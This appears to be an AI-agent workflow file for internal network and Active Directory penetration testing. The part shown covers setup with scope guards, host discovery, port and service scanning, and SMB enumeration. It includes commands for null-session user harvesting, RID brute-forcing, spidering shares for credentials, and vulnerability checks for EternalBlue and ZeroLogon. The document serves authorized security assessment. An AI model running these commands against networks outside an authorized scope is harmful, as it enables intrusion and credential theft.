---
name: W_HUNT_NETWORK
description: Network infrastructure and Active Directory security assessment
trigger: IP range, CIDR, or internal network target detected
agents: [ReconAgent, NetworkServiceAgent, ActiveDirectoryAgent, WindowsAgent, LateralMovementAgent, ExploitDevAgent, ValidatorAgent, ExploitChainAgent]
tools: [burp-bridge, credential-vault, auth-manager, playwright-harness]
skills_invoked: [NetworkSecurity, ActiveDirectory]
---

# W_HUNT_NETWORK — Network Infrastructure & Active Directory Security Assessment Workflow

> End-to-end internal / infrastructure / Active Directory kill chain: host discovery, full TCP plus top-UDP service enumeration with NSE, per-service exploitation, lockout-aware credential attacks, the complete AD escalation graph (Kerberos, delegation, ACLs, ADCS, coercion+relay, DCSync), single-host privilege escalation, lateral movement and pivoting, and targeted exploit weaponization. Profile before attack, hypothesis before payload, proof before report.

---

## Operating Doctrine

The mindset a senior internal/AD tester brings to every engagement. Read this before touching a packet.

- **Understand before you attack.** A network is a graph of trust relationships, not a list of IPs. Build the picture first — who authenticates to whom, where the DCs and CAs live, which hosts hold the cached privileged tokens — then strike the shortest, quietest path. Reconnaissance debt is paid back in failed exploits and blown detections.
- **Hypothesis-driven probing.** Every technique starts with an explicit hypothesis ("this template lets a low-priv user request a cert as DA") and ends with a binary result. You are not "running tools," you are confirming or killing a specific claim about the target's trust model.
- **Profile, then exploit.** No service gets attacked before it is fingerprinted: version, configuration, auth surface, and signing/relay posture. The order is always enumerate -> reason -> exploit. Skipping the profile step is how testers DoS a fragile appliance or trip a lockout sweep.
- **Proxy and capture everything.** All HTTP-bearing traffic (appliance UIs, ADCS web enrollment `/certsrv`, printer admin, management consoles, nuclei) goes through Burp at `http://127.0.0.1:8080` with a real browser User-Agent. Raw L4 protocols (SMB, LDAP, Kerberos, RPC, DB wire protocols) cannot ride an HTTP proxy — capture them with a scoped `tcpdump` pcap into the run directory so every claim has a wire-level artifact. Authenticated web work uses the bundled `playwright-harness.ts` (dev-browser primary, Playwright fallback) so the session is real, not forged.
- **Evidence or it did not happen.** Each finding carries the exact command, the raw tool output, the timestamp, and ideally a pcap or screenshot. Hashes and tickets are stored encrypted in the vault and redacted in the report. Reproduction is a paste, not a paragraph.
- **Scope discipline is non-negotiable.** Every target IP is checked against the engagement allowlist before any active step. Lateral movement stays inside authorized boundaries; a pivot host does not become a license to roam. Out-of-scope auth coercion (relaying a victim that drifts off-scope) is a finding to report, not an action to take.
- **Depth vs breadth is a deliberate call.** Sweep wide for live hosts and obvious wins (null SMB, default creds, MS17-010), then go deep on the handful of hosts that move the privilege graph (DCs, CAs, delegation hosts, DB servers). Do not deep-dive 250 workstations; do deep-dive the one with unconstrained delegation.
- **Safety over spectacle.** Prefer non-destructive, reversible techniques. DoS-prone NSE scripts, kernel exploits on production, and aggressive sprays are gated behind explicit written sign-off. The goal is to prove impact, not to cause an outage that ends the test.

---

## Dispatch Map (engagement: network)

The hunt orchestrator routes phases to owning specialists. Every technique in this file ends with an explicit `-> Agent` dispatch using these owners.

| Stage key | Owning agent | Responsibility |
|-----------|--------------|----------------|
| `recon` | ReconAgent | Host discovery, live-host mapping, port/service enumeration, OS fingerprinting |
| `services` | NetworkServiceAgent | Per-service profiling and exploitation; default/weak credential testing per service |
| `directory` | ActiveDirectoryAgent | Active Directory enumeration and the full domain escalation graph |
| `host` | WindowsAgent | Single-host (Windows/Linux) local privilege escalation |
| `move` | LateralMovementAgent | Pass-the-* execution, credential harvesting, tunneling and pivoting |
| `weaponize` | ExploitDevAgent | Custom exploit development for service CVEs that have no safe public PoC |
| `validate` | ValidatorAgent | Reproduce, de-duplicate by root cause, CVSS scoring, hunt-mode gating |
| `chain` | ExploitChainAgent | Correlate findings into kill chains and elevate combined severity |

```bash
# Show the routed plan for this engagement before starting
bun "$TOOLS/agent-router.ts" --engagement network
```

---

## Pre-Flight

Run this block once before Phase 1. It wires Burp, loads scope and credentials, sets a browser User-Agent, creates the run output directory, prepares multi-identity contexts, and installs the hard scope guard. Nothing active happens until these pass.

```bash
# ---- Identifiers ----
TARGET="$1"                                  # CIDR, range, IP, or AD domain (e.g. corp.target.com)
TARGET_SLUG="$(echo "$TARGET" | tr '/: .' '----' | tr -s '-' | sed 's/-$//')"
ENGAGEMENT="network"

# ---- Tooling root (bundled harness tools) ----
TOOLS=~/.claude/skills/BugBountyFramework/Tools

# ---- Run output directory (all artifacts land here) ----
SESSION_DIR=~/.claude/MEMORY/BugBounty/Sessions/${TARGET_SLUG}
RUN_DIR=$SESSION_DIR
mkdir -p "$RUN_DIR"/{scans,services,creds,loot,bloodhound,adcs,relay,pivot,evidence,pcap,reports}
SCAN_DIR=$RUN_DIR/scans
SVC_DIR=$RUN_DIR/services
LOOT_DIR=$RUN_DIR/loot

# ---- Browser User-Agent for all HTTP tooling ----
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"

# ---- Burp proxy wiring (HTTP-bearing services only) ----
BURP_PROXY="http://127.0.0.1:8080"
bun "$TOOLS/burp-bridge.ts" --health || echo "[warn] Burp down — HTTP traffic will not be captured; continue raw, do not block"
# Sync the in-scope hosts/appliance hostnames into Burp target scope
bun "$TOOLS/burp-bridge.ts" --sync-scope --scope "$(paste -sd, "$RUN_DIR/scope.txt" 2>/dev/null)"

# ---- Wire pcap capture for raw L4 protocols (SMB/LDAP/Kerberos/RPC/DB) ----
# Run on the attack interface; scope to the engagement CIDR to avoid capturing noise.
IFACE=eth0
sudo tcpdump -i "$IFACE" -w "$RUN_DIR/pcap/network-$(date +%s).pcap" net "$TARGET" -U &
TCPDUMP_PID=$!
echo "$TCPDUMP_PID" > "$RUN_DIR/pcap/tcpdump.pid"

# ---- Hard scope guard ----
# scope.txt = authoritative allowlist (one CIDR/IP/hostname per line, supplied in the RoE).
# in_scope <ip> returns 0 only if the IP falls inside an allowlisted range.
cat > "$RUN_DIR/scope.txt" <<'EOF'
# Populate from Rules of Engagement before running. Example:
# 10.10.0.0/16
# corp.target.com
EOF
in_scope() {
  local ip="$1"
  bun "$TOOLS/hunt-orchestrator.ts" --target "$TARGET" --scope-check "$ip" 2>/dev/null | grep -q IN_SCOPE
}
# Usage in every active step: in_scope "$h" || { echo "[skip OOS] $h"; continue; }

# ---- Multi-identity setup (low-priv vs admin where relevant) ----
# Store every credential set in the vault — NEVER inline secrets in commands or artifacts.
# Low-privilege domain user (default attacker foothold):
bun "$TOOLS/credential-vault.ts" --store --target "${TARGET_SLUG}-lowpriv" --username 'lowpriv' --password '<from-RoE>'
# Privileged/validation identity (only if the RoE provides one for verification):
bun "$TOOLS/credential-vault.ts" --store --target "${TARGET_SLUG}-admin"   --username 'svc_audit' --password '<from-RoE>'
# Pull them back at use time (env vars HUNT_USER/HUNT_PASS override the vault):
LP_USER=$(bun "$TOOLS/credential-vault.ts" --get --target "${TARGET_SLUG}-lowpriv" --field username)
LP_PASS=$(bun "$TOOLS/credential-vault.ts" --get --target "${TARGET_SLUG}-lowpriv" --field password)

# ---- Domain context (fill once AD is confirmed) ----
DOMAIN=""          # e.g. corp.target.com
DOMAIN_DN=""       # e.g. DC=corp,DC=target,DC=com
TARGET_DC=""       # primary DC IP
DC_HOST=""         # DC FQDN
LISTENER_IP=""     # attacker IP for coercion/relay/tunnels
```

Pre-Flight gate (all must hold before Phase 1 starts):

| Check | Command | Pass condition |
|-------|---------|----------------|
| Scope loaded | `grep -vc '^#' "$RUN_DIR/scope.txt"` | At least one allowlisted entry |
| Burp reachable | `bun "$TOOLS/burp-bridge.ts" --health` | Proxy alive (warn-only if down) |
| Output dir | `ls -d "$RUN_DIR"/scans` | Directory exists |
| Vault creds | `bun "$TOOLS/credential-vault.ts" --list` | Low-priv identity present (if provided) |
| pcap running | `kill -0 "$(cat "$RUN_DIR/pcap/tcpdump.pid")"` | Capture process alive |
| No conflicting session | `bun "$TOOLS/hunt-orchestrator.ts" --target "$TARGET" --status` | No `running` session (or `--resume`) |

> Tooling note: this workflow uses `nxc` (NetExec) as the primary protocol Swiss-army knife. `crackmapexec` / `cme` are the legacy aliases of the same project; substitute freely if `nxc` is absent. `piranha tools network` prints the full per-domain CLI matrix and marks which binaries are present on PATH; a missing CLI degrades that one technique gracefully.

---

## Coverage Matrix

The authoritative internal/AD checklist mapped to the phase/technique that covers it. If it is in this table, it is in this file.

| Checklist item | Phase / Technique |
|----------------|-------------------|
| Host discovery & live-host mapping | 1.1 ICMP/ARP/TCP/UDP discovery; 1.2 live-host consolidation |
| Full TCP port enumeration | 2.1 Full TCP SYN `-p-` |
| Top-UDP port enumeration | 2.2 UDP top-ports |
| Service/version + OS fingerprint + NSE | 2.3 Service detection; 2.4 NSE default/safe scripts; 2.5 OS fingerprint |
| SMB null/guest sessions | 3.1 SMB anonymous/guest enumeration |
| SMB signing posture (relay surface) | 3.2 SMB signing & relay-target list |
| EternalBlue-class (MS17-010 etc.) | 3.3 SMB remote vulns |
| SMB share hunting | 3.4 Share enumeration & spidering |
| RDP NLA posture | 3.5 RDP enumeration |
| RDP BlueKeep (CVE-2019-0708) | 3.6 RDP remote vulns |
| SSH auth methods / weak creds | 3.7 SSH enumeration & weak auth |
| SNMP communities + write access | 3.8 SNMP enumeration & RW abuse |
| SMTP user-enum / open relay | 3.9 SMTP enumeration |
| LDAP anonymous bind | 3.10 LDAP anonymous enumeration |
| NFS / rsync exposure | 3.11 NFS & rsync exposure |
| FTP / TFTP | 3.12 FTP & TFTP enumeration |
| MSSQL (xp_cmdshell) | 3.13 MSSQL profiling & RCE |
| PostgreSQL (COPY PROGRAM) | 3.14 PostgreSQL profiling & RCE |
| MySQL / MariaDB | 3.15 MySQL profiling |
| MongoDB | 3.16 MongoDB exposure |
| Redis | 3.17 Redis exposure & RCE |
| Printers / PRET | 3.18 Network printer abuse |
| Appliance CVEs (Citrix/Fortinet/PAN/Exchange) | 3.19 Appliance CVE triage (-> 8.x weaponize) |
| Default/weak credential spraying (netexec) | 4.1 Default creds; 4.2 lockout-aware password spraying |
| NTLM hash capture (poisoning) | 4.3 Responder/mitm6 capture |
| NTLM coercion (PetitPotam/Coercer) | 4.4 Authentication coercion |
| NTLM relay (SMB/LDAP/ADCS) | 4.5 Relay execution |
| BloodHound shortest-paths | 5.1 BloodHound collection & path analysis |
| Kerberoasting | 5.2 Kerberoast |
| AS-REP roasting | 5.3 AS-REP roast |
| Unconstrained delegation | 5.4 Unconstrained delegation abuse |
| Constrained delegation (S4U) | 5.5 Constrained delegation abuse |
| RBCD | 5.6 Resource-based constrained delegation |
| ACL abuse (GenericAll/WriteDACL/etc.) | 5.7 ACL & shadow-credential abuse |
| ADCS ESC1-13 (Certipy) | 5.8 ADCS escalation |
| DCSync | 5.9 DCSync |
| GPO abuse | 5.10 GPO abuse |
| Single-host Windows privilege escalation | 7.1 Windows local privesc |
| Single-host Linux privilege escalation | 7.2 Linux local privesc |
| Pass-the-Hash | 6.1 PtH |
| Pass-the-Ticket / Overpass-the-Hash / PtK | 6.2 PtT/OPtH/PtK |
| PsExec / WMI / WinRM / DCOM / SMB exec | 6.3 Remote execution methods |
| LSASS / SAM / DPAPI harvesting | 6.4 Credential harvesting |
| Tunneling ligolo-ng / chisel + proxychains | 6.5 Pivoting & tunneling |
| Custom exploit dev for service CVEs | 8.x Exploit weaponization |
| No DoS-prone NSE without sign-off | Operating Doctrine; Pre-Flight; OpSec & Scope Discipline |
| Lockout-aware spraying | 4.2; OpSec & Scope Discipline |

---

## Workflow Trigger Conditions

This workflow activates when the hunt orchestrator detects any of:
- CIDR notation (e.g. `10.0.0.0/24`, `192.168.1.0/16`)
- IP range (e.g. `10.0.0.1-254`)
- Single IP or hostname exposing non-web services
- Target config with `type: network|infrastructure|internal`
- An Active Directory domain name (e.g. `corp.target.com`)

```bash
bun "$TOOLS/hunt-orchestrator.ts" --target "$TARGET" --workflow "W_HUNT_NETWORK"
```

---

## Phase 1: NETWORK DISCOVERY & LIVE-HOST MAPPING

**Owner:** ReconAgent (`recon`) · **Parallelizable:** discovery probes run concurrently per protocol.

**Objective & expert rationale.** Build the ground truth of what is alive before spending a single packet on enumeration. A senior tester treats discovery as cartography: every live host, its reachable L3/L4 surface, and the subnet topology. Firewalls that drop ICMP will hide hosts from a naive ping sweep, so discovery is layered (ICMP + ARP + TCP-SYN + UDP) and cross-validated. Getting this wrong means whole VLANs of targets are silently skipped.

**Gate-in.** Pre-Flight passed; `scope.txt` populated; pcap running.

**Recon hand-off inputs (optional but preferred).** If the recon workflow (W_RECON) ran first, seed this phase from its artifacts under `~/.claude/MEMORY/BugBounty/Sessions/${TARGET_SLUG}/recon/`: `reports/handoff-notes.md` and `reports/high-priority-targets.txt` (prioritized attack surface), `hosts/live-ips.txt` (CDN/WAF-bypassing origin IPs to fold into `live_hosts.txt`), `ports/nmap-services.*` (pre-run `-sV/-sC` service data), `scope/cidrs.txt` + `scope/ptr-hostnames.txt` (cross-reference against `scope.txt`), and `leaks/emails.txt` + `leaks/breaches.txt` (username/credential-spray seeds consumed in Phase 4.2). Treat recon output as a head start, not a substitute — re-validate liveness before active steps.

### 1.1 Layered host discovery

- **Objective / hypothesis:** Live hosts exist that a single-protocol sweep would miss (ICMP-filtered hosts answer on TCP/UDP).
- **Procedure:**
```bash
# ICMP echo/timestamp/netmask
nmap -sn -PE -PP -PM "$TARGET" -oA "$SCAN_DIR/disc_icmp"
# ARP (local subnet only — authoritative for L2-reachable hosts)
nmap -sn -PR "$TARGET" -oA "$SCAN_DIR/disc_arp"
# TCP-SYN discovery on high-signal ports (bypasses ICMP-blocking firewalls)
nmap -sn -PS21,22,23,25,53,80,88,110,111,135,139,143,389,443,445,464,636,993,995,1433,1723,3268,3306,3389,5432,5985,5986,8080 \
  "$TARGET" -oA "$SCAN_DIR/disc_syn"
# UDP discovery on common datagram services
nmap -sn -PU53,67,69,111,123,137,138,161,162,500,514,520,623,631,1434,1900,4500,5353 \
  "$TARGET" -oA "$SCAN_DIR/disc_udp"
```
- **Indicators:** `Status: Up` lines across the gnmap outputs; hosts present in TCP/UDP sweeps but absent from ICMP are firewalled and high-interest.
- **Validation:** A host is "live" if confirmed by >=2 probe families or a single open-port response. Re-probe singletons to rule out transient drops.
- **Evasion / edge cases:** Behind an IDS, add `--max-rate 100 --scan-delay 50ms` and randomize order with `--randomize-hosts`. ARP works only on the local segment — across routed boundaries rely on TCP-SYN. IPv6 segments need `-6` and link-local neighbor discovery.
- **Severity:** Informational (enabler).
- **Dispatch:** -> ReconAgent

### 1.2 Live-host consolidation & subnet map

- **Objective / hypothesis:** A de-duplicated, ordered live-host list and a subnet density map focus all later phases.
- **Procedure:**
```bash
cat "$SCAN_DIR"/disc_*.gnmap | grep 'Status: Up' | awk '{print $2}' | sort -u \
  | sort -t. -k1,1n -k2,2n -k3,3n -k4,4n > "$SCAN_DIR/live_hosts.txt"
echo "[*] Live hosts: $(wc -l < "$SCAN_DIR/live_hosts.txt")"
# Density per /24 (find the populated VLANs)
awk -F. '{print $1"."$2"."$3".0/24"}' "$SCAN_DIR/live_hosts.txt" | sort | uniq -c | sort -rn \
  > "$SCAN_DIR/subnet_density.txt"
# Fast second-opinion sweep with naabu
naabu -list "$SCAN_DIR/live_hosts.txt" -top-ports 100 -silent -o "$SCAN_DIR/naabu_quick.txt"
```
- **Indicators:** Non-empty `live_hosts.txt`; dense /24s that map to server VLANs vs. sparse workstation ranges.
- **Validation:** Spot-check three hosts with a manual `nmap -Pn -p 445,443` to confirm reachability before committing the list downstream.
- **Evasion / edge cases:** If `live_hosts.txt` is empty but the range should be populated, the perimeter is likely dropping your probes — switch to `-Pn` treat-as-up for the next phase and tighten timing.
- **Severity:** Informational (enabler).
- **Dispatch:** -> ReconAgent

**Phase artifacts:** `scans/disc_*.{nmap,gnmap,xml}`, `scans/live_hosts.txt`, `scans/subnet_density.txt`, `scans/naabu_quick.txt`.

**Gate-out:** `live_hosts.txt` non-empty (or explicit `-Pn` decision recorded); subnet density mapped.
```bash
[ -s "$SCAN_DIR/live_hosts.txt" ] && \
  bun "$TOOLS/hunt-orchestrator.ts" --target "$TARGET" --phase discovery --status completed \
    --data "{\"live\": $(wc -l < "$SCAN_DIR/live_hosts.txt")}"
```

---

## Phase 2: PORT & SERVICE ENUMERATION

**Owner:** ReconAgent (`recon`) · **Parallelizable:** TCP and UDP scans run concurrently; NSE batched per service family.

**Objective & expert rationale.** Convert live hosts into a precise service inventory — full TCP, top-UDP, versions, OS, and safe NSE metadata. The full `-p-` sweep is mandatory: the interesting service (a forgotten Redis on 6379, a Jenkins on 50000, an RDP on a non-standard port) is exactly the one a top-1000 scan misses. Enumeration here is informational only; nothing is exploited until Phase 3, after the profile is reasoned about.

**Gate-in.** `live_hosts.txt` present.

### 2.1 Full TCP port scan

- **Objective / hypothesis:** High-value services listen on non-standard or high ports outside the top-1000.
- **Procedure:**
```bash
# Stage 1: fast full-range SYN sweep to find open ports
nmap -sS -Pn -p- --min-rate 2000 -T4 --open -iL "$SCAN_DIR/live_hosts.txt" -oA "$SCAN_DIR/tcp_full"
# Build a per-host open-port map for targeted version scans
grep -oP '^Host: \S+|\d+/open' "$SCAN_DIR/tcp_full.gnmap" >/dev/null 2>&1
for h in $(cat "$SCAN_DIR/live_hosts.txt"); do
  p=$(grep "Host: $h " "$SCAN_DIR/tcp_full.gnmap" | grep -oP '\d+/open' | cut -d/ -f1 | paste -sd,)
  [ -n "$p" ] && echo "$h: $p" >> "$SCAN_DIR/host_port_map.txt"
done
```
- **Indicators:** Open ports per host; clustering of 88/389/445/636/3268 flags domain controllers; 1433/3306/5432/6379/27017 flags databases.
- **Validation:** Re-scan any host that returns suspiciously few ports with `--min-rate 500` (rate-limiting can drop SYN replies and hide ports).
- **Evasion / edge cases:** Through a stateful firewall, `-sS` may be normalized — fall back to `-sT` connect scans. For loud environments throttle `--min-rate` and add `--scan-delay`. DoS-prone: avoid `--min-rate 10000` against fragile ICS/appliance hosts.
- **Severity:** Informational (enabler).
- **Dispatch:** -> ReconAgent

### 2.2 Top-UDP port scan

- **Objective / hypothesis:** UDP-only services (SNMP, TFTP, NetBIOS, IKE, IPMI) expose enumeration and credential surface invisible to TCP scans.
- **Procedure:**
```bash
nmap -sU --top-ports 200 -Pn --open --min-rate 500 -iL "$SCAN_DIR/live_hosts.txt" -oA "$SCAN_DIR/udp_top200"
# Targeted high-value UDP services with version probes
nmap -sUV -p 53,69,123,137,161,500,623,1434,1900,5353 --open -iL "$SCAN_DIR/live_hosts.txt" -oA "$SCAN_DIR/udp_keysvc"
```
- **Indicators:** `open|filtered` collapsing to `open` on version probe; 161/udp open = SNMP enumeration target; 623/udp = IPMI (cipher-zero / hash leak).
- **Validation:** UDP `open|filtered` is ambiguous — confirm with a protocol-specific probe (e.g. `snmpwalk`, `ike-scan`) before treating as live.
- **Evasion / edge cases:** UDP scans are slow and lossy; scope to key services rather than `--top-ports 1000` on a /16. Rate-limited ICMP-unreachable responses cause false `closed` — slow down.
- **Severity:** Informational (enabler).
- **Dispatch:** -> ReconAgent

### 2.3 Service/version detection

- **Objective / hypothesis:** Exact product+version strings drive precise CVE correlation and exploit selection.
- **Procedure:**
```bash
while IFS=: read -r host ports; do
  in_scope "$host" || continue
  nmap -sV --version-intensity 7 -p "$ports" "$host" -oA "$SVC_DIR/ver_${host}"
done < "$SCAN_DIR/host_port_map.txt"
# Roll up a service summary and high-value buckets
grep -hE '\d+/(tcp|udp)\s+open' "$SVC_DIR"/ver_*.nmap | awk '{$1=$2=$3="";print}' | sort | uniq -c | sort -rn \
  > "$SCAN_DIR/service_summary.txt"
grep -hlE 'kerberos-sec|ldap|microsoft-ds|msrpc|globalcatLDAP' "$SVC_DIR"/ver_*.nmap > "$SCAN_DIR/ad_targets.txt"
grep -hlE 'ms-sql|mysql|postgres|mongodb|redis' "$SVC_DIR"/ver_*.nmap > "$SCAN_DIR/db_targets.txt"
grep -hlE 'http|ssl/http|http-proxy' "$SVC_DIR"/ver_*.nmap > "$SCAN_DIR/web_targets.txt"
```
- **Indicators:** Banner versions; `Windows Server 2012 R2` etc. in service notes; DC role confirmed by Kerberos+LDAP+GC co-residence.
- **Validation:** Cross-check banners against a second source (`nxc smb <host>` for OS build, `httpx -title -tech-detect` for web) — banners can be spoofed or stale.
- **Evasion / edge cases:** `--version-intensity 9` is noisier; drop to 4 in monitored environments. Some appliances tarpit version probes — set `--host-timeout`.
- **Severity:** Informational (enabler).
- **Dispatch:** -> ReconAgent

### 2.4 NSE default/safe scripting

- **Objective / hypothesis:** Default and safe NSE scripts surface low-risk, high-signal metadata (SMB OS, security mode, SSL certs, NTLM info) without intrusive actions.
- **Procedure:**
```bash
# SAFE category only — no intrusive/DoS scripts in the default pass
nmap -sV --script "default,safe and not (broadcast or dos)" -p- -Pn \
  -iL "$SCAN_DIR/live_hosts.txt" -oA "$SCAN_DIR/nse_safe" --open
# Targeted metadata pulls
nmap -p445 --script "smb-os-discovery,smb-security-mode,smb2-security-mode,smb2-time" \
  -iL "$SCAN_DIR/live_hosts.txt" -oN "$SVC_DIR/smb_meta.txt"
nmap -p389 --script "ldap-rootdse" -iL "$SCAN_DIR/ad_targets.txt" -oN "$SVC_DIR/ldap_rootdse.txt"
nmap -p443,636,993,995,3389,5986,1433 --script "ssl-cert,ssl-enum-ciphers" \
  -iL "$SCAN_DIR/live_hosts.txt" -oN "$SVC_DIR/ssl_meta.txt"
```
- **Indicators:** Domain/forest names from `ldap-rootdse`; `message_signing: disabled` from SMB security mode; hostnames/SANs from certs revealing internal naming.
- **Validation:** Treat NSE output as leads; confirm each with a protocol client (Phase 3) before reporting.
- **Evasion / edge cases:** Never run `--script vuln` or `--script intrusive` in this pass — those can crash fragile services. DoS-prone scripts (`rdp-vuln-ms12-020`, `smb-flood`, `*-dos`) are sign-off gated and deferred to Phase 3 vuln checks.
- **Severity:** Informational (enabler).
- **Dispatch:** -> ReconAgent

### 2.5 OS fingerprinting & role labeling

- **Objective / hypothesis:** Accurate OS + role labels (DC, CA, file server, DB, hypervisor) prioritize the privilege graph.
- **Procedure:**
```bash
sudo nmap -O --osscan-guess -Pn -iL "$SCAN_DIR/live_hosts.txt" -oN "$SVC_DIR/os_fingerprint.txt"
# Authoritative Windows build/role via SMB
nxc smb "$SCAN_DIR/live_hosts.txt" 2>/dev/null | tee "$SVC_DIR/nxc_smb_roster.txt"
# Label CAs (ADCS) — look for certsrv / pKIEnrollmentService later in 5.8
grep -iE 'domain controller|primary' "$SVC_DIR/nxc_smb_roster.txt" > "$SCAN_DIR/dc_list.txt"
```
- **Indicators:** `(domain: corp.target.com) (signing:True) (SMBv1:False)` lines; DCs identified; SMBv1-enabled hosts flagged as legacy/vulnerable.
- **Validation:** Confirm DC role with `nslookup -type=SRV _ldap._tcp.dc._msdcs.$DOMAIN` and Kerberos port presence.
- **Severity:** Informational (enabler).
- **Dispatch:** -> ReconAgent

**Phase artifacts:** `scans/tcp_full.*`, `scans/udp_*.*`, `scans/host_port_map.txt`, `services/ver_*.*`, `scans/service_summary.txt`, `scans/{ad,db,web}_targets.txt`, `scans/dc_list.txt`, `services/{smb_meta,ldap_rootdse,ssl_meta,os_fingerprint,nxc_smb_roster}.txt`.

**Gate-out:** Service inventory complete; DCs/CAs/DBs/web/appliances bucketed.
```bash
bun "$TOOLS/hunt-orchestrator.ts" --target "$TARGET" --phase enumeration --status completed \
  --data "{\"services\": $(wc -l < "$SCAN_DIR/service_summary.txt"), \"dcs\": $(wc -l < "$SCAN_DIR/dc_list.txt")}"
```

---

## Phase 3: PER-SERVICE PROFILING & EXPLOITATION

**Owner:** NetworkServiceAgent (`services`) · **Parallelizable:** service families are independent — run SMB, RDP, SSH, SNMP, SMTP, LDAP, NFS, FTP, DB, printer, and appliance tracks concurrently.

**Objective & expert rationale.** Turn the inventory into footholds. Each service is profiled (config, auth, version) and then probed for its canonical misconfigurations and exploitable vulns. The expert ordering is anonymous-first (null/guest, anon bind, open relay, public community) because unauthenticated wins are the cheapest and quietest; authenticated and CVE-driven exploitation follows only after profiling justifies it.

**Gate-in.** Phase 2 service buckets present; pcap running; HTTP services wired through Burp.

### 3.1 SMB — null/guest & anonymous enumeration

- **Objective / hypothesis:** Null or guest sessions expose users, groups, password policy, and shares without credentials.
- **Procedure:**
```bash
# Null and guest session checks across the estate
nxc smb "$SCAN_DIR/live_hosts.txt" -u '' -p '' --shares | tee "$SVC_DIR/smb_null.txt"
nxc smb "$SCAN_DIR/live_hosts.txt" -u 'guest' -p '' --shares | tee "$SVC_DIR/smb_guest.txt"
# RID-brute user enumeration via null session (against a DC)
nxc smb "$TARGET_DC" -u '' -p '' --rid-brute 10000 | tee "$SVC_DIR/smb_ridbrute.txt"
# Comprehensive anonymous enum
enum4linux-ng -A "$TARGET_DC" -oJ "$SVC_DIR/enum4linux"
rpcclient -U "" -N "$TARGET_DC" -c "enumdomusers;enumdomgroups;querydominfo;getdompwinfo" \
  | tee "$SVC_DIR/rpcclient_null.txt"
# Harvest usernames for later spraying
grep -oP 'user:\[\K[^\]]+' "$SVC_DIR/rpcclient_null.txt" | sort -u >> "$RUN_DIR/creds/domain_users.txt"
```
- **Indicators:** `READ`/`WRITE` on non-default shares; populated user/group lists; `getdompwinfo` returns lockout threshold and min length.
- **Validation:** Re-list one readable share with `smbclient //host/share -N -c 'ls'` to confirm the access is real, not a banner.
- **Evasion / edge cases:** Modern Windows disables guest by default; null sessions often allow `--rid-brute` even when share listing is denied. Some hosts permit null IPC$ but block enumeration — try `--users`/`--groups` separately.
- **Severity:** Medium-High. CVSS 3.1 `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` (7.5) for anonymous data disclosure. Business impact: hands an attacker the full user list and lockout policy — the seed for every credential attack.
- **Dispatch:** -> NetworkServiceAgent

### 3.2 SMB — signing posture & relay-target list

- **Objective / hypothesis:** Hosts with SMB signing not required are NTLM relay landing zones.
- **Procedure:**
```bash
# Generate the relay candidate list (signing not required)
nxc smb "$SCAN_DIR/live_hosts.txt" --gen-relay-list "$RUN_DIR/relay/relay_targets.txt"
nmap -p445 --script smb-security-mode,smb2-security-mode -iL "$SCAN_DIR/live_hosts.txt" \
  -oN "$SVC_DIR/smb_signing.txt"
echo "[*] Relay candidates: $(wc -l < "$RUN_DIR/relay/relay_targets.txt")"
```
- **Indicators:** Hosts listed in `relay_targets.txt`; `message_signing: disabled (dangerous)` lines.
- **Validation:** Confirm by relaying a coerced auth (Phase 4.5) to one candidate and landing a session — do not just trust the list.
- **Evasion / edge cases:** DCs require signing by default (not relay targets via SMB), but member servers frequently do not. LDAP signing/channel-binding posture is separate (see 5.8 ESC8 / LDAP relay).
- **Severity:** High (enabler). CVSS contribution realized in 4.5. Business impact: any coerced privileged auth becomes code execution on the relay target.
- **Dispatch:** -> NetworkServiceAgent

### 3.3 SMB — EternalBlue-class remote vulns

- **Objective / hypothesis:** Legacy hosts are vulnerable to wormable, unauth RCE (MS17-010 and relatives).
- **Procedure:**
```bash
# Detection only (safe script) — exploitation is gated to Phase 8
nmap -p445 --script smb-vuln-ms17-010 -iL "$SCAN_DIR/live_hosts.txt" -oN "$SVC_DIR/ms17010.txt"
nxc smb "$SCAN_DIR/live_hosts.txt" -u '' -p '' -M zerologon 2>/dev/null | tee "$SVC_DIR/zerologon_check.txt"
nxc smb "$SCAN_DIR/live_hosts.txt" -u '' -p '' -M petitpotam 2>/dev/null | tee "$SVC_DIR/petitpotam_check.txt"
```
- **Indicators:** `State: VULNERABLE` for ms17-010; ZeroLogon (CVE-2020-1472) module reporting vulnerable.
- **Validation:** Confirm exploitability in a lab replica or with the vendor-safe checker before weaponizing. ZeroLogon's PoC resets the DC machine password — NEVER run the destructive variant on production; report the detection.
- **Evasion / edge cases:** ms17-010 detection is safe; the exploit can BSOD older hosts — Phase 8 only, with sign-off and a snapshot/restore plan. SMBv1 disabled = not exploitable.
- **Severity:** Critical. MS17-010 CVSS 3.1 `AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H` (8.1, wormable in practice); ZeroLogon 10.0. Business impact: unauth RCE / instant domain compromise.
- **Dispatch:** -> ExploitDevAgent (weaponization) / NetworkServiceAgent (detection)

### 3.4 SMB — share hunting & spidering

- **Objective / hypothesis:** Readable shares contain credentials, configs, scripts, and PII.
- **Procedure:**
```bash
# Map shares + permissions with a low-priv identity
nxc smb "$SCAN_DIR/live_hosts.txt" -u "$LP_USER" -p "$LP_PASS" --shares | tee "$SVC_DIR/smb_shares_auth.txt"
# Deep spider for secrets across readable shares
nxc smb "$SCAN_DIR/live_hosts.txt" -u "$LP_USER" -p "$LP_PASS" -M spider_plus \
  -o DOWNLOAD_FLAG=False OUTPUT_FOLDER="$LOOT_DIR/spider"
smbmap -H "$TARGET_DC" -u "$LP_USER" -p "$LP_PASS" -R --depth 5 \
  | tee "$SVC_DIR/smbmap_recursive.txt"
# Hunt for high-value file types
grep -iE '\.(kdbx|config|conf|ini|xml|json|ps1|bat|vbs|vmdk|bak| vhdx)' "$SVC_DIR/smbmap_recursive.txt" \
  > "$LOOT_DIR/share_loot_candidates.txt"
```
- **Indicators:** `READ` on `SYSVOL`/`NETLOGON` (GPP passwords), backup shares, `IT`/`Scripts` shares; `unattend.xml`, `web.config`, `.kdbx`.
- **Validation:** Download a candidate file over the session and confirm the secret parses (e.g. decode a GPP `cpassword`). Store loot encrypted in the vault.
- **Evasion / edge cases:** `DOWNLOAD_FLAG=False` keeps spidering quiet (lists without exfil) — flip only for confirmed targets under data-handling rules. Large file servers: scope `--share` to avoid hours of spidering.
- **Severity:** Medium-High depending on contents; cleartext creds in SYSVOL/GPP -> Critical. Business impact: file-share secrets routinely yield domain credentials.
- **Dispatch:** -> NetworkServiceAgent

